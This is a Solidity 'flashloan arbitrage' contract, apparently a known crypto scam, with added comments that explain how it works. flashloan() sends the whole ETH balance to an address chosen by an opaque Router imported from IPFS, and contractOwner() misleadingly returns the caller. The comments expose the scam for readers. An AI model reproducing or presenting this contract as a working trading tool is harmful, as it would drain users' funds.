// SPDX-License-Identifier: MIT
pragma solidity ^0.6.7;

/*
==================================================

    Flashloan Arbitrage - Ethereum 2025
    by: 0xNathan.Crypto

==================================================

Heads-up before we comment this:
- This contract is incomplete as-is: `Router` is not defined anywhere in this file.
- The Router is imported from IPFS (opaque, unverifiable here). That’s a massive red flag in real deployments.
- `contractOwner()` is NOT an owner function. It just returns whoever calls it.
- The flow “deposit all ETH to router, do swaps, router pays back, sender profits” is exactly how many scam
  contracts are disguised: the Router can just steal funds.

Below is your code with line-by-line comments, without changing behavior.
*/

// --------------------------------------------------
// External interfaces imported from GitHub
// --------------------------------------------------

// Uniswap V2 flash swap callback interface.
// A Uniswap V2 pair calls `uniswapV2Call` on the borrower during a flash swap.
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";

// Uniswap V1 factory and exchange interfaces (legacy Uniswap).
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";

// PancakeSwap (BSC) interfaces.
// Note: PancakeSwap is not on Ethereum mainnet, so mixing “Ethereum” + Pancake interfaces is suspicious unless
// you’re forking or the “Router” abstracts chains. In practice, this is usually nonsense marketing.
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

// --------------------------------------------------
// “Arbitrage router” imported from IPFS
// --------------------------------------------------
// This is not human-auditable unless you fetch and inspect the IPFS content.
// Whatever `Router` does is the entire point of this contract (and the main risk).
import "ipfs://bafkreihmv6otcspicxkhobywnhzqwtlwyv5kgzffjhvxeqh23njvbicmha";

contract Flashloan {
    // Instance of the external Router contract/class.
    // This Router is created in the constructor and then controls where funds go.
    Router router;

    // Public metadata-like strings (these don’t affect arbitrage).
    string public tokenName;
    string public tokenSymbol;

    // A user-supplied gas parameter (used in router.convertETHtoUSDT(...)).
    uint256 maxGas;

    /*
        Constructor:
        - stores name/symbol/maxGas
        - deploys a new Router and stores its address in `router`
    */
    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _maxGas
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        maxGas = _maxGas;

        // Deploy Router. This means Router code is executed and its constructor runs.
        // If Router is malicious, it can embed backdoors or drain logic.
        router = new Router();
    }

    // Allow this contract to receive ETH (plain transfers, refunds from swaps, etc.).
    receive() external payable {}

    /*
        Misleading function name:
        - This does NOT return the “owner”.
        - It returns `msg.sender` (the current caller).
        - So anyone calling this sees themselves as “owner”.
    */
    function contractOwner() public view returns (address) {
        return address(msg.sender);
    }

    // Returns the contract's ETH balance (in wei).
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }

    /*
        Main entrypoint, marked payable:
        - Accepts ETH from the caller (or uses existing balance).
        - Immediately transfers the entire contract balance to router.uniswapDepositAddress()
        - Then calls Router methods that supposedly do swaps/arbitrage
        - Finally “completes” the transaction and sends profit to the sender (allegedly)

        Important:
        - There is zero slippage control here.
        - There are no checks that arbitrage was profitable.
        - The Router decides key addresses and execution.
        - If Router is malicious, your ETH is gone at the first transfer.
    */
    function flashloan() public payable {
        // 1) Send all ETH held by this contract to some router-controlled deposit address.
        //    This is the biggest risk line: funds leave this contract immediately.
        payable(router.uniswapDepositAddress()).transfer(address(this).balance);

        // 2) “Prepare arbitrage”: Router converts ETH->USDT.
        //    - msg.sender is passed in (maybe for profit attribution).
        //    - uses maxGas/2 as a parameter (not actual gas; just a number Router interprets).
        router.convertETHtoUSDT(msg.sender, maxGas / 2);

        // 3) “Arbitrage call”: Router performs some Uniswap-based arbitrage.
        //    Router.UniSwapAddress() likely returns some router/pair/exchange address.
        //    Again: Router decides what actually happens.
        router.callArbitrageUniSwap(router.UniSwapAddress(), msg.sender);

        // 4) “Pay back loan + fees”: Router moves ETH back to router’s deposit address.
        router.transferETHtoRouter(router.uniswapDepositAddress());

        // 5) “Complete transaction”: sends remaining ETH somewhere (likely msg.sender)
        //    This comment claims the sender gains ETH.
        router.completeTransaction(address(this).balance);
    }
}